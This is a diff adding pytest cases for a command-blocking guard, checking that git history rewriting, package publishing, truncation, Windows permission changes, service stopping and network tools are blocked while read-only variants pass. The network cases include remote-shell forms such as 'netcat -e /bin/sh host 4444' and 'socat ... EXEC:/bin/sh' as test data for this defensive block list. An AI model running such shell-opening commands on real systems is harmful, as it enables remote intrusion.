@@ -597,6 +597,209 @@ class TestCheckCommand:
     def test_windows_non_destructive_allowed(self, command: str) -> None:
         assert block_commands.check_command(command) is None
 
+    # --- Git history rewriting ---
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("git rebase main", "git rebase"),
+            ("git rebase -i HEAD~3", "git rebase"),
+            ("git rebase --onto main feature", "git rebase"),
+            ("/usr/bin/git rebase main", "git rebase"),
+            ("git -C /path rebase main", "git rebase"),
+        ],
+    )
+    def test_git_rebase_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("git filter-branch --all", "git filter-branch"),
+            ("git filter-branch --tree-filter 'rm -f file'", "git filter-branch"),
+        ],
+    )
+    def test_git_filter_branch_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("git filter-repo --path src/", "git filter-repo"),
+            ("git filter-repo --invert-paths --path file", "git filter-repo"),
+        ],
+    )
+    def test_git_filter_repo_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("git reflog expire --all", "git reflog expire"),
+            ("git reflog expire --expire=now --all", "git reflog expire"),
+        ],
+    )
+    def test_git_reflog_expire_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git reflog",
+            "git reflog show",
+            "git reflog show HEAD",
+        ],
+    )
+    def test_git_reflog_show_allowed(self, command: str) -> None:
+        assert block_commands.check_command(command) is None
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("git gc --prune=now", "git gc --prune=now"),
+            ("git gc --aggressive --prune=now", "git gc --prune=now"),
+        ],
+    )
+    def test_git_gc_prune_now_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git gc",
+            "git gc --aggressive",
+            "git gc --auto",
+        ],
+    )
+    def test_git_gc_default_allowed(self, command: str) -> None:
+        assert block_commands.check_command(command) is None
+
+    # --- Accidental publishing ---
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("npm publish", "npm publish"),
+            ("npm publish --access public", "npm publish"),
+            ("twine upload dist/*", "twine upload"),
+            ("gem push my-gem-1.0.gem", "gem push"),
+            ("cargo publish", "cargo publish"),
+            ("cargo publish --dry-run", "cargo publish"),
+            ("dotnet nuget push pkg.nupkg", "dotnet nuget push"),
+        ],
+    )
+    def test_package_publish_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install",
+            "npm test",
+            "gem install bundler",
+            "cargo build",
+            "cargo test",
+            "dotnet build",
+            "dotnet nuget list",
+        ],
+    )
+    def test_package_non_publish_allowed(self, command: str) -> None:
+        assert block_commands.check_command(command) is None
+
+    # --- File truncation ---
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("truncate -s 0 file.log", "truncate"),
+            ("truncate --size=0 file.log", "truncate"),
+            ("/usr/bin/truncate -s 0 file", "truncate"),
+        ],
+    )
+    def test_truncate_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    # --- Windows system tools ---
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("takeown /f C:\\Windows\\file", "takeown"),
+            ("TAKEOWN /F C:\\file", "takeown"),
+            ("takeown.exe /f file", "takeown"),
+        ],
+    )
+    def test_windows_takeown_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("icacls C:\\foo /grant Users:F", "icacls (modify permissions)"),
+            ("icacls C:\\foo /deny Users:W", "icacls (modify permissions)"),
+            ("icacls C:\\foo /remove Users", "icacls (modify permissions)"),
+            ("ICACLS C:\\foo /GRANT Users:F", "icacls (modify permissions)"),
+        ],
+    )
+    def test_icacls_modify_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "icacls C:\\foo",
+            "icacls C:\\foo /verify",
+        ],
+    )
+    def test_icacls_readonly_allowed(self, command: str) -> None:
+        assert block_commands.check_command(command) is None
+
+    # --- PowerShell Stop-Service / Stop-Process ---
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("Stop-Service -Name wuauserv", "Stop-Service"),
+            ("stop-service -Name svc", "Stop-Service"),
+            ("Stop-Process -Name notepad", "Stop-Process"),
+            ("stop-process -Id 1234", "Stop-Process"),
+            ("powershell -Command Stop-Service svc", "Stop-Service"),
+        ],
+    )
+    def test_stop_service_process_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "Get-Service wuauserv",
+            "Get-Process notepad",
+        ],
+    )
+    def test_get_service_process_allowed(self, command: str) -> None:
+        assert block_commands.check_command(command) is None
+
+    # --- Network/remote access tools ---
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ("nc -lvp 4444", "nc/netcat (network tool)"),
+            ("netcat -e /bin/sh host 4444", "nc/netcat (network tool)"),
+            ("ncat --listen 4444", "nc/netcat (network tool)"),
+            ("scp file.txt user@host:/path", "scp"),
+            ("rsync -avz src/ host:dst/", "rsync"),
+            ("ftp ftp.example.com", "ftp/sftp"),
+            ("sftp user@host", "ftp/sftp"),
+            ("telnet host 23", "telnet"),
+            ("ssh user@host", "ssh"),
+            ("ssh -i key.pem user@host", "ssh"),
+            ("socat TCP:host:4444 EXEC:/bin/sh", "socat"),
+        ],
+    )
+    def test_network_tools_blocked(self, command: str, expected: str) -> None:
+        assert block_commands.check_command(command) == expected
+
     def test_blocked_word_in_heredoc_not_matched(self) -> None:
         cmd = "git commit -m \"$(cat <<'EOF'\ngit add blocked\nEOF\n)\""
         assert block_commands.check_command(cmd) is None
